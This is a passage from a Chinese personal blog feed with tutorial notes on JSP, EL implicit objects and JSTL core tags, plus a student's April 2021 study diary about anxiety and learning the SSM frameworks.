id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>看图，输出内容是 boolean 的 true 或 false ：</p><p><img src="https://xorex.space/image/211.jpg"></p><h4 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h4><p>判断被传入的对象是否为 null，如果是返回 true 否则返回 false。</p><h4 id="表达式运算"><a href="#表达式运算" class="headerlink" title="表达式运算"></a>表达式运算</h4><p>传入一个表达式，会自动计算表达式的值，然后输出结果，不解释了。</p><h4 id="三元表达式"><a href="#三元表达式" class="headerlink" title="三元表达式"></a>三元表达式</h4><p><code>Expression ? Statement : Statement</code> 可以使用这玩意，不解释了。</p><h3 id="EL-中隐含对象"><a href="#EL-中隐含对象" class="headerlink" title="EL 中隐含对象"></a>EL 中隐含对象</h3><p>因为 EL 是专门用来代替 <code>&lt;%=Expression%&gt;</code> 的，尤其是处理在四大作用域里面存储的 Map 属性映射。除了我们直接按照作用域范围从小到大去使用 name 值检索其映射的 value 以外，还可以直接获取对应作用域范围里面的隐含 Map 对象来操作：</p><table><thead><tr><th>序号</th><th>隐含对象名称</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>pageContext</td><td>对应于 JSP 页面中的 pageContext 对象（注意：取的是 pageContext 对象。）</td></tr><tr><td>2</td><td>pageScope</td><td>代表 page 域中用于保存属性的 Map 对象</td></tr><tr><td>3</td><td>requestScope</td><td>代表 request 域中用于保存属性的 Map 对象</td></tr><tr><td>4</td><td>sessionScope</td><td>代表 session 域中用于保存属性的 Map 对象</td></tr><tr><td>5</td><td>applicationScope</td><td>代表 application 域中用于保存属性的 Map 对象</td></tr><tr><td>6</td><td>param</td><td>表示一个保存了所有请求参数的 Map 对象</td></tr><tr><td>7</td><td>paramValues</td><td>表示一个保存了所有请求参数的 Map 对象，它对于某个请求参数，返回的是一个 string[]</td></tr><tr><td>8</td><td>header</td><td>表示一个保存了所有 http 请求头字段的 Map 对象，注意：如果头里面有“-” ，例 Accept-Encoding，则要 header[“Accept-Encoding”]</td></tr><tr><td>9</td><td>headerValues</td><td>表示一个保存了所有 http 请求头字段的 Map 对象，它对于某个请求参数，返回的是一个 string[] 数组。注意：如果头里面有 “-“ ，例 Accept-Encoding，则要 headerValues[“Accept-Encoding”]</td></tr><tr><td>10</td><td>cookie</td><td>表示一个保存了所有 cookie 的 Map 对象</td></tr><tr><td>11</td><td>initParam</td><td>表示一个保存了所有 web 应用初始化参数的 map 对象</td></tr></tbody></table><h4 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h4><ol><li><p>不可以用上面返回的 Map 对象来向里面改动里面的映射，也就是说，只能读不能写。</p></li><li><p>对于获取有特殊字符的键值对映射，不可以使用 <code>.Key-Name</code> ，老老实实 <code>[&quot;Key-Name&quot;]</code> 吧，尤其是在获取请求头的时候，这种情况比较多。</p></li></ol><h4 id="pageContext-对象"><a href="#pageContext-对象" class="headerlink" title="pageContext 对象"></a>pageContext 对象</h4><p>这个对象就是 Servlet 里面的 PageContext 的对象，可以获取 JSP 内置的其他八大对象，所以这个东西在 EL 的意义就是获取其他对象来获取大量的页面信息，如：</p><p>访问协议、服务器 IP、服务器端口、工程路径、会话 ID、客户端 IP 等等，当中都是借助它保存的其他八大对象来获取的。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.scheme&#125;</span><br><span class="line">$&#123;pageContext.request.serverName&#125;</span><br><span class="line">$&#123;pageContext.request.serverPort&#125;</span><br></pre></td></tr></table></figure><h4 id="Values-系列"><a href="#Values-系列" class="headerlink" title="Values 系列"></a>Values 系列</h4><p>里面获取的 Map 里面提到了有 <code>&lt;String,Stirng[]&gt;</code> 这样映射方式的，就是后缀带 Values 的。主要是为了应对有一个对应多个的映射，比如 checkbox 多选框等等，所以返回一个 String[] 数组方便处理，如果是用 <code>&lt;String,String&gt;</code> 映射的 Map 获取其参数，则默认为第一个元素。</p><h4 id="initParam"><a href="#initParam" class="headerlink" title="initParam"></a>initParam</h4><p>获取的参数是 web.xml 中的，<code>&lt;context-param&gt;</code> 标签设置的初始化参数。可以用来获取并初始化使用。</p><h2 id="JSTL-标签库"><a href="#JSTL-标签库" class="headerlink" title="JSTL 标签库"></a>JSTL 标签库</h2><h3 id="JSTL-概述"><a href="#JSTL-概述" class="headerlink" title="JSTL 概述"></a>JSTL 概述</h3><p>JSTL 全称为：JSP Standard Tag Library 是用来加强 JSP 中的代码块 <code>&lt;% %&gt;</code> 而诞生的，目的就是希望在 HTML 中不要出现 Java 的逻辑代码。</p><h3 id="lt-c-set-gt"><a href="#lt-c-set-gt" class="headerlink" title="&lt;c:set&gt;"></a>&lt;c:set&gt;</h3><p>这个 JSTL 标签的写法就是上面这样其中 c 表示 core 为核心库的意思，set 表示标签的类型，为设置类型。此标签的作用是向作用域中保存数据：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set scope=&quot;request&quot; var=&quot;Tempest&quot; value=&quot;Xorex&quot;&gt;&lt;/c:set&gt;</span><br></pre></td></tr></table></figure><p>表示向作用域 request 中写入键值对映射 ：<code>&quot;Tempest&quot;-&gt;&quot;Xorex&quot;</code>。</p><h3 id="lt-c-if-gt"><a href="#lt-c-if-gt" class="headerlink" title="&lt;c:if&gt;"></a>&lt;c:if&gt;</h3><p>用于判断 test 属性中填写的表达式返回的 boolean 值，如果为 true ，那么处理此标签包含的内容，如果为 false，则略过标签包含的内容。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:if test=&quot;$&#123;&#x27;Xorex&#x27;.equals(&#x27;Tempest&#x27;)&#125;&quot;&gt;$&#123;&quot;Xorex is Tempest!&quot;&#125;&lt;/c:if&gt;</span><br><span class="line">$&#123;<span class="string">&quot;Xorex is not Tempest!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt"><a href="#lt-c-choose-gt-lt-c-when-gt-lt-c-otherwise-gt" class="headerlink" title="&lt;c:choose&gt; &lt;c:when&gt; &lt;c:otherwise&gt;"></a>&lt;c:choose&gt; &lt;c:when&gt; &lt;c:otherwise&gt;</h3><p>这个就是为了弥补 <code>&lt;c:if&gt;</code> 里面没有 else 而出现的 switch 语句。最外面必须是 <code>&lt;c:choose&gt;</code> 语句包裹起来，里面则是 <code>&lt;c:when test=&quot;BooleanExpression&quot;&gt;</code> 用来处理 test 为 true 的情况（执行处理包裹代码），如果没有 when 处理的话，则会交给 <code>&lt;c:otherwise&gt;</code> 处理。这里面是没有穿透效应的，被 when 处理之后，就退出 choose 标签里面了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;Xorex.waifu==Yukino&#125;&quot;</span>&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Yukino is my waifu!&quot;</span>&#125;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;Xorex.waifu==Megumi&#125;&quot;</span>&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Megumi is my waifu!&quot;</span>&#125;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:otherwise&gt;</span><br><span class="line">        $&#123;<span class="string">&quot;Have not this kind of situation.&quot;</span>&#125;</span><br><span class="line">    &lt;/c:otherwise&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br></pre></td></tr></table></figure><h3 id="lt-c-forEach-gt"><a href="#lt-c-forEach-gt" class="headerlink" title="&lt;c:forEach&gt;"></a>&lt;c:forEach&gt;</h3><p>用来遍历，是集合 for 和增强 for 的存在。</p><ul><li>当作普通循环，begin 和 end 设置枚举范围，var 设置枚举对象名：</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach begin=<span class="string">&quot;0&quot;</span> end=<span class="string">&quot;10&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;i&quot;</span>&gt;</span><br><span class="line">   $&#123;i&#125;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><ul><li>当作增强循环，在 itens 中输入实现了迭代器的对象，然后 var 设置单个遍历出来的变量名。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;array&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;waifu&quot;</span>&gt;</span><br><span class="line">   $&#123;waifu&#125; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><ul><li>遍历 Map ，首先用 map 对象的 entrySet() 方法返回一个 EntrySet 对象，然后用增强循环遍历这个 Set，并获取每个 map 里保存的 key 和 value。</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">&quot;$&#123;map.entrySet()&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;entry&quot;</span>&gt;</span><br><span class="line">   $&#123;entry.key&#125; $&#123;entry.value&#125; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><p>这里有一个值得说一说的 varStatus 属性，给他设置一个变量名之后，便可以通过这个变量名访问这个对象，它里面记录了本次循环的各种信息，可以供我们参考：</p><p><img src="https://xorex.space/image/212.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;EL&quot;&gt;&lt;a href=&quot;#EL&quot; class=&quot;headerlink&quot; title=&quot;EL&quot;&gt;&lt;/a&gt;EL&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;EL 全程为 Expression Language 的意思，是在 JSP 中用来代替表达式 &lt;code&gt;&amp;lt;</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="EL" scheme="https://xorex.space/tags/EL/"/>
    
    <category term="JSTL" scheme="https://xorex.space/tags/JSTL/"/>
    
  </entry>
  
  <entry>
    <title>TodoList:2021-04</title>
    <link href="https://xorex.space/2021/04/01/1d19b4be91dc/"/>
    <id>https://xorex.space/2021/04/01/1d19b4be91dc/</id>
    <published>2021-04-01T13:31:28.000Z</published>
    <updated>2021-05-09T14:11:13.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于我重新想要写-TodoList-这件事"><a href="#关于我重新想要写-TodoList-这件事" class="headerlink" title="关于我重新想要写 TodoList 这件事"></a>关于我重新想要写 TodoList 这件事</h2><p>三月份的 TodoList 我个人觉得我完成的还算成功，因为除了第六条对于我这种社恐来说实在难以完成，其他五条基本上都已经做到了，无论是学习效率还是学习习惯，都已经进入了一个全新的高度。</p><p>其实现在这个东西现在就已经不是 TodoList 了，因为我发现根本不需要 TodoList 来督促我提高学习的效率，自认为上一个星期中，我的效率已经够高了，高到甚至能达到高三时的 80% 。我相信这是绝大多数大学生都难以到达的高度了（当然肯定比不了双一流的内卷大佬们）。加上上一篇的 TodoList 记录了不到 10 天就鸽了，所以我似乎并没有理由再写一篇 TodoList。</p><p>但是不写总觉得难受，觉得还是要记录下来些什么，学习感悟也好，内心感想也罢，亦或者把这篇博客当成说说分享每天的见闻。所以这次的 4 月份 TodoList 会更加的开放，希望仍然可以被 4 月份温柔以待啊！</p><h2 id="每一天的记录"><a href="#每一天的记录" class="headerlink" title="每一天的记录"></a>每一天的记录</h2><h3 id="04-03"><a href="#04-03" class="headerlink" title="04-03"></a>04-03</h3><p>今天是和往常一样的日子，不过唯一的不同是因为今天是假期，所以变得懒散了起来，上午纵容自己睡了个懒觉（毕竟这一个星期真的是太累了啊），寝室里面比较冷清。下午则是来到了实验室继续肝进度，晚上则是和家里面通了电话，好累啊，明天再努力吧……</p><h3 id="04-05"><a href="#04-05" class="headerlink" title="04-05"></a>04-05</h3><p>今天不太想要去学习，想着一直肝了这么久了（但是还是比不过肝神思达同学），于是就给自己放了一天的假期，当自己尝试去看动画放松的时候，发现根本看不下去，满脑子想的都是自己的项目没做完，停下来放松开始看看项目的时候，又因为假期心里原因看不下去项目，两个都没有办法处理好。</p><p>无法在学习以外的领域进入 <code>心流</code> 状态，已经是我现在最悲哀的事了。</p><p>想想自己好像已经因为焦虑，丧失了获取快乐的能力，正如同知乎里面这个问题的答案一样：<a href="https://www.zhihu.com/question/37672919/answer/224810826">为什么越努力，越焦虑？</a>。我不仅把努力当成手段，也当成了目标。然后强迫自己每天努力，好像不努力学习就是在浪费时间，然后变得更加焦虑。</p><p>所以有什么解决的方法吗，我觉得我现在唯一能做的就是努力忘记未来，仅仅只是活在当下，活在每一天的每一件小事情身上，然后用最高的效率，努力去完成它。未来的事情不用想，想了也没有用，自己只要每天都在享受生活，每天都在全力以赴即可。车至山前必有路，船到桥头自然直，成为一名幸福的普通人就够了！</p><h3 id="04-16"><a href="#04-16" class="headerlink" title="04-16"></a>04-16</h3><p>我果然是个鸽王啊，QAQ 感觉这一晃半个月过去了自己好像啥都每学的样子，真是让人倍感焦虑（又来了）。结束了 Java Web，开始了框架，这大概就是我半个月里面做的事情了吧。</p><p>这几天见证了： Web 项目总结 -&gt; 学习 Spring -&gt; 学习 MyBatis -&gt; 学习 Spring -&gt; 学习 MyBatis -&gt; Web 项目总结，的反复横跳，总算将项目总结写完了，下一步是快速学习 SSM 三大框架，然后做一个项目出来之后，再对三大框架分别进行复盘总结。</p><p>大概是想尝试一条新的学习路线：先快速掌握大概，然后在代码练习中逐渐加深理解，之后通过项目整合，最后复盘总结。更改一下我学一点就总结一点的习惯，我觉得对于一些常用的操作，根本不需要总结，因为用的很多，自然不会忘记，真正需要总结的东西是需要知道，但是理解成本很高，不太常用的东西，在总结的过程中帮助理解和记忆，并留下来复习的副本。</p><p>那些用的多的东西，虽然又多又杂，但是因为有文档很好搜到加上理解成本低，就不需要写博客记录，忘了就再翻阅文档看看并试验一下就记住了。平时学习的时候就要注意多复习多思考，锻炼自己的不断记忆能力啊！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于我重新想要写-TodoList-这件事&quot;&gt;&lt;a href=&quot;#关于我重新想要写-TodoList-这件事&quot; class=&quot;headerlink&quot; title=&quot;关于我重新想要写 TodoList 这件事&quot;&gt;&lt;/a&gt;关于我重新想要写 TodoList 这件事&lt;/</summary>
      
    
    
    
    <category term="阶段性总结" scheme="https://xorex.space/categories/%E9%98%B6%E6%AE%B5%E6%80%A7%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="规划" scheme="https://xorex.space/tags/%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>JSP 页面开发</title>
    <link href="https://xorex.space/2021/03/31/3c183c4054d2/"/>
    <id>https://xorex.space/2021/03/31/3c183c4054d2/</id>
    <published>2021-03-31T13:26:33.000Z</published>
    <updated>2021-04-01T12:52:40.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSP-概述"><a href="#JSP-概述" class="headerlink" title="JSP 概述"></a>JSP 概述</h2><blockquote><p>JSP（全称为 JavaServer Pages）是由 Sun 公司主导建立的一种动态网页技术标准。JSP 部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成 HTML、XML 或其他格式文档的 Web 网页，然后返回给请求者。JSP 技术以 Java 语言作为脚本语言，为用户的 HTTP 请求提供服务，并能与服务器上的其它 Java 程序共同处理复杂的业务需求。</p></blockquote><p>JSP 适合用来处理动态网页的生成，其实本质上还是会翻译成正规的 Servlet 的 Java 程序，只不过 JSP 的技术让我们开发动态网页更加方便了。</p><h2 id="JSP-原理"><a href="#JSP-原理" class="headerlink" title="JSP 原理"></a>JSP 原理</h2><p>JSP 本质上是一个 Servlet 程序，当我们启动 Tomcat 的时候，会将我们写的 JSP 程序翻译成一个完整的 Servlet 程序，在：<code>\JetBrains\IntelliJIdea2020.3\tomcat\d2e3b327-bf64-4ef1-9da7-9edd1aeafdaa\work\Catalina\localhost\BookStore\org\apache\jsp</code> 里面，可以看到 <code>.java</code> 和 <code>.class</code> 文件，这就是被 Tomcat 临时翻译的 Servlet 程序。（因为还没有正式部署到 Tomcat 里面）</p><h2 id="JSP-基本语法"><a href="#JSP-基本语法" class="headerlink" title="JSP 基本语法"></a>JSP 基本语法</h2><h3 id="JSP-表达式"><a href="#JSP-表达式" class="headerlink" title="JSP 表达式"></a>JSP 表达式</h3><p><code>&lt;%= Expression %&gt;</code> 会翻译为 <code>out.print(Expression)</code> 输出。所以表达式不可以带分号，否则会报错。</p><p>比如下面代码使用 JSP 表达式在一级标题标签里面输出时间。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;&lt;%= new Date() %&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-脚本"><a href="#JSP-脚本" class="headerlink" title="JSP 脚本"></a>JSP 脚本</h3><p><code>&lt;% Codes; %&gt;</code> 里面的多行代码会被完整的平移到 <code>_jspService()</code> 方法里面，成为方法内部执行代码。因为是完整平移，所以可以作脚本片段拼接，实现循环输出 HTML 代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;&lt;%= new Date() %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-声明"><a href="#JSP-声明" class="headerlink" title="JSP 声明"></a>JSP 声明</h3><p><code>&lt;%! Codes; %&gt;</code> 里面的多行代码会被完整的平移到类里面（非方法），所以里面只可以声明属性和方法（或者静态代码块）。上面的 JSP 脚本就不可以声明这些（因为在 <code>_jspService()</code> 方法内部）只可以执行代码，而 JSP 声明相反。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">toOut</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++) &#123;</span><br><span class="line">            System.out.println(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    toOut();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="JSP-注释"><a href="#JSP-注释" class="headerlink" title="JSP 注释"></a>JSP 注释</h3><p><code>&lt;%-- JSP 注释 --%&gt;</code> 隐式 JSP 注释，在 Servlet 代码中看不到。</p><p><code>&lt;!-- HTML 注释 --&gt;</code> 显式注释，在客户端可以看到这个 html 注释源码。</p><p><code>&lt;% // /*Java 注释*/ %&gt;</code> 隐式 Java 注释，在 Servlet 代码中看不到。</p><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>各个 JSP 块之间是无法嵌套的，必须独立使用！！！</p><h2 id="jspService-提供对象"><a href="#jspService-提供对象" class="headerlink" title="_jspService() 提供对象"></a>_jspService() 提供对象</h2><p>从生成的 Servlet 代码中可以看到，在 <code>_jspService()</code> 方法中，已经为我们提供了下面的八个实例化好的对象，供我们在 <code>&lt;% %&gt;</code> 代码块中使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">pageContext = _jspxFactory.getPageContext(<span class="keyword">this</span>, request, response,</span><br><span class="line">    <span class="keyword">null</span>, <span class="keyword">true</span>, <span class="number">8192</span>, <span class="keyword">true</span>);</span><br><span class="line">_jspx_page_context = pageContext;</span><br><span class="line">application = pageContext.getServletContext();</span><br><span class="line">config = pageContext.getServletConfig();</span><br><span class="line">session = pageContext.getSession();</span><br><span class="line">out = pageContext.getOut();</span><br><span class="line">_jspx_out = out;</span><br></pre></td></tr></table></figure><h2 id="JSP-指令"><a href="#JSP-指令" class="headerlink" title="JSP 指令"></a>JSP 指令</h2><p>JSP 指令是告诉 Servlet 转化引擎一些信息，类似于配置信息，格式为：<code>&lt;%@ 指令 属性名=&quot;值&quot; %&gt;</code>，属性可以写在一个指令语句中（用空格分开），也可以写在多个指令语句中。</p><h3 id="page-指令"><a href="#page-指令" class="headerlink" title="page 指令"></a>page 指令</h3><blockquote><p>page 指令用于定义 JSP 页面的各种属性，无论 page 指令出现在 JSP 页面中的什么地方，它作用的都是整个 JSP 页面。</p></blockquote><ul><li><p><code>[ language=&quot;java&quot; ]</code> 指明页面的脚本语言，默认为 Java</p></li><li><p><code>[ extends=&quot;package.class&quot; ]</code> 指定生成的 Servlet 程序继承的类，默认为 HttpJspBase，间接继承</p></li><li><p><code>[ import=&quot;&#123;package.class | package.*&#125;, ...&quot; ]</code> 用于导入页面所用的外部类</p></li><li><p><code>[ session=&quot;true | false&quot; ]</code> 指明页面是否使用 session 会话，默认为 true</p></li><li><p><code>[ buffer=&quot;none | 8kb | sizekb&quot; ]</code> 用于设置页面缓冲区，建议使用默认的 8kb</p></li><li><p><code>[ autoFlush=&quot;true | false&quot; ]</code> 设置自动刷新缓冲区默认为 true</p></li><li><p><code>[ isThreadSafe=&quot;true | false&quot; ]</code> 表明页面是否使用了多线程，默认为 true</p></li><li><p><code>[ info=&quot;text&quot; ]</code> 设置一个字符串信息 text，用于描述本页面的信息</p></li><li><p><code>[ errorPage=&quot;relative_url&quot; ]</code> 指定页面出错时跳转页面的位置，设置优先度高于 web.xml</p></li><li><p><code>[ isErrorPage=&quot;true | false&quot; ]</code> 用于标注本页面为错误处理页面，会报错错误信息到 exception 中，默认为 false</p></li><li><p><code>[ contentType=&quot;mimeType [ ;charset=characterSet ]&quot; | &quot;text/html ; charset=ISO-8859-1&quot; ]</code> 指定页面的数据类型，编码等。</p></li><li><p><code>[ pageEncoding=&quot;characterSet | ISO-8859-1&quot; ]</code> 指定数据编码格式</p></li><li><p><code>[ isELIgnored=&quot;true | false&quot; ]</code> 控制 JSP 某些版本的用法是否被忽略</p></li></ul><h3 id="include-指令"><a href="#include-指令" class="headerlink" title="include 指令"></a>include 指令</h3><p>用于引入外部的 jsp 文件，插入到当前的位置，要求两个页面的 page 指令不能冲突。因为引入外部 jsp 页面之后，会将两个文件合在一起，翻译成一个 Servlet 程序。</p><p>head.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;h1 style=&quot;color:red&quot;&gt;这玩意是文件头&lt;/h1&gt;&lt;br&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>foot.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;h1 style=&quot;color:pink&quot;&gt;这玩意是文件尾&lt;/h1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将上面两个文件引入到当前 jsp 文件中:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> errorPage=<span class="string">&quot;Error.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Test for include&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;head.jsp&quot;</span>%&gt;</span><br><span class="line">&lt;h1&gt;俺是文件中间！&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;%@ include file=<span class="string">&quot;foot.jsp&quot;</span> %&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JSP-内置对象"><a href="#JSP-内置对象" class="headerlink" title="JSP 内置对象"></a>JSP 内置对象</h2><table><thead><tr><th>NO.</th><th>内置对象</th><th>类型</th></tr></thead><tbody><tr><td>1</td><td>pageContext</td><td>javax.servlet.jsp.PageContext</td></tr><tr><td>2</td><td>request</td><td>javax.servlet.http.HttpServletRequest</td></tr><tr><td>3</td><td>response</td><td>javax.servlet.http.HttpServletResponse</td></tr><tr><td>4</td><td>session</td><td>javax.servlet.http.HttpSession</td></tr><tr><td>5</td><td>application</td><td>javax.servlet.ServletContext</td></tr><tr><td>6</td><td>config</td><td>javax.servlet.ServletConfig</td></tr><tr><td>7</td><td>out</td><td>javax.servlet.jsp.JspWriter</td></tr><tr><td>8</td><td>page</td><td>java.lang.Object</td></tr><tr><td>9</td><td>exception</td><td>java.lang.Throwable</td></tr></tbody></table><h3 id="四大作用域"><a href="#四大作用域" class="headerlink" title="四大作用域"></a>四大作用域</h3><p>pageContext，request，session，application，四种对象的作用域范围测验：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;pageContext&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;request&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;One&quot;</span>,<span class="string">&quot;session&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;One&quot;</span>, <span class="string">&quot;application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">pageContext 作用域：&lt;%=pageContext.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">request 作用域：&lt;%=request.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">session 作用域：&lt;%=session.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br><span class="line">application 作用域：&lt;%=application.getAttribute(<span class="string">&quot;One&quot;</span>) %&gt; &lt;br&gt;</span><br></pre></td></tr></table></figure><p>打开上面的页面，发现所有的都有值，说明都在作用域范围内。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：pageContext</span><br><span class="line">request 作用域：request</span><br><span class="line">session 作用域：session</span><br><span class="line">application 作用域：application</span><br></pre></td></tr></table></figure><ul><li>pageContext 作用域限制在当前的页面中，下面添加请求转发，离开当前页面，发现 pageContext 属性值无法读取，已经离开作用域：</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% request.getRequestDispatcher(<span class="string">&quot;/head.jsp&quot;</span>).forward(request, response); %&gt;</span><br></pre></td></tr></table></figure><p>读取结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pageContext 作用域：null</span><br><span class="line">request 作用域：request</span><br><span class="line">session 